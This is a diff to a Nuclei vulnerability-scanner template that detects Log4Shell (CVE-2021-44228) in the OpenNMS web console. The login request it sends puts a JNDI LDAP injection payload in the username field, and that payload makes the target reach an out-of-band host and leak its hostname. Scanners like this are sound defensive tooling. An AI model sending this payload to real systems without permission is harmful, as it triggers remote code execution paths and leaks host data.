@@ -17,13 +17,9 @@ info:
     cve-id: CVE-2021-44228
     cwe-id: CWE-77
   metadata:
-    verified: true
-    max-request: 1
     shodan-query: title:"OpenNMS Web Console"
+    verified: "true"
   tags: jndi,log4j,rce,opennms,cve,cve2021,kev,oast
-variables:
-  rand1: '{{rand_int(111, 999)}}'
-  rand2: '{{rand_int(111, 999)}}'
 
 http:
   - raw:
@@ -32,32 +28,29 @@ http:
         Referer: {{RootURL}}/opennms/login.jsp
         Content-Type: application/x-www-form-urlencoded
 
-        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
+        j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
 
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
+        part: interactsh_protocol  # Confirms the DNS Interaction
         words:
           - "dns"
 
       - type: regex
         part: interactsh_request
         regex:
-
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
 
     extractors:
       - type: kval
         kval:
-
+          - interactsh_ip # Print remote interaction IP in output
 
       - type: regex
-        group: 2
-        regex:
         part: interactsh_request
-
-      - type: regex
         group: 1
         regex:
-        part: interactsh_request
-# digest: 4b0a00483046022100ad9e04f18f29293c12461bf90042fbdbb3368b564e5e8ad6cda96360a0c2eeff022100a755cb774e7dae7c5d497165f8adce0aea2fec0546e53f64f1f54c0b056112f7:922c64590222798bb761d5b6d8e72950
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
+
+# Enhanced by cs on 2022/10/23
